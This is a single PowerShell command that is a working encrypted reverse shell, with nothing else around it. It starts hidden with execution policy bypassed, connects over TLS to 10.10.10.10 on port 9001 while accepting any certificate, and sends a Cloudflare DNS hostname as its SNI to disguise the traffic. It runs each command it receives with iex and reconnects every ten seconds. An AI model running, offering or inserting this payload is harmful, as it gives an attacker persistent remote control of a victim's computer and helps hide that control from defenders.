powershell -nop -W hidden -noni -ep bypass -c "$s='10.10.10.10';$p=9001;$sn='cloudflare-dns.com';$pr=[System.Security.Authentication.SslProtocols]::Tls12;while($true){try{$c=New-Object System.Net.Sockets.TCPClient($s,$p);$st=$c.GetStream();$ss=New-Object Net.Security.SslStream($st,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$ss.AuthenticateAsClient($sn,$null,$pr,$false);if(!$ss.IsEncrypted -or !$ss.IsSigned){$c.Close();continue}$w=New-Object System.IO.StreamWriter($ss);$w.AutoFlush=$true;$w.WriteLine(\"`n[*] Secure Session Established`n[*] SNI Mask: $sn`n\");while($c.Connected){$w.Write('PS '+(pwd).Path+'> ');$b=New-Object Byte[] 4096;$r=$ss.Read($b,0,$b.Length);if($r -gt 0){$cmd=([text.encoding]::UTF8).GetString($b,0,$r).Trim();if($cmd -eq 'exit'){break}if($cmd){try{$o=iex $cmd 2>&1|Out-String;if([string]::IsNullOrWhiteSpace($o)){$w.Write(\"`r`n\")}else{$w.Write($o)}}catch{$w.Write($_.Exception.Message+\"`n\")}}}}$c.Close()}catch{Start-Sleep -s 10}}"
